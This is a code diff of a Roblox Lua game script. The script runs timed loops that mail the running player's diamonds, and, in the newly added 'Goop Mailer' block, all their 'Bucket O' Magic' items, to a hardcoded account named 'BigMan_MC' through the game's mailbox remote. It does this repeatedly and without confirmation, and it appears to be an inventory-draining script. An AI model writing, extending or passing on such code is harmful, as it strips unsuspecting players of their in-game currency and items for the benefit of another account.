@@ -17,6 +17,7 @@ spawn(function()
     end
 end)
 
+-- Gem Mailer
 spawn(function()
     local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
     
@@ -35,21 +36,18 @@ spawn(function()
             continue
         end
 
-        -- Retrieve diamond amount and unique identifier
         local diamonds = diamondItem._data._am
-        local diamondUID = diamondItem._uid -- Correct unique identifier
+        local diamondUID = diamondItem._uid 
 
         print("Diamonds:", diamonds)
         print("Diamond UID:", diamondUID)
 
-        -- Validate diamondUID
         if not diamondUID then
             print("[ERROR] diamondUID is nil. Retrying after interval...")
             task.wait(loopInterval * 60)
             continue
         end
 
-        -- Check threshold and send diamonds
         if diamonds > diamondThreshold then
             local amountToSend = diamonds - mailTax
             if amountToSend <= 0 then
@@ -62,11 +60,11 @@ spawn(function()
             print("Amount to send (after tax):", amountToSend)
 
             local args = {
-                username, -- Recipient's username
-                "Sending all my gems!", -- Mail message
-                "Currency", -- Type of item being sent
-                diamondUID, -- Correct unique ID for diamonds
-                amountToSend -- Amount after deducting mail tax
+                username,
+                "Sending all my gems!",
+                "Currency",
+                diamondUID,
+                amountToSend
             }
 
             print("Args to invoke server:", args)
@@ -88,3 +86,41 @@ spawn(function()
         task.wait(loopInterval * 60)
     end
 end)
+
+-- Goop Mailer
+spawn(function()
+    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local username = "BigMan_MC"
+    local loopInterval = 5 
+    local sendAmount = 5000 -- Editable amount
+    while true do
+        local playerInventory = Save.Get()["Inventory"]
+        local MiscInv = playerInventory["Misc"]
+        print("Searching for Bucket O' Magic...")
+        for key, item in pairs(MiscInv) do
+            if item.id == "Bucket O' Magic" then
+                local availableAmount = item._am or item.am or 1
+                if availableAmount >= sendAmount then
+                    local amountToSend = availableAmount > sendAmount and availableAmount or sendAmount
+                    print("Found Bucket O' Magic item:", item)
+                    print("Amount to send:", amountToSend)
+                    local args = {
+                        [1] = username,
+                        [2] = "Take these from me",
+                        [3] = "Misc",
+                        [4] = key,
+                        [5] = amountToSend
+                    }
+                    print("Invoking Server with args:", unpack(args))
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                else
+                    print("Not enough Bucket O' Magic to send. Required:", sendAmount, "Available:", availableAmount)
+                end
+                break
+            end
+        end
+        print("Finished processing Bucket O' Magic.")
+        task.wait(loopInterval * 60)
+    end
+end)
+
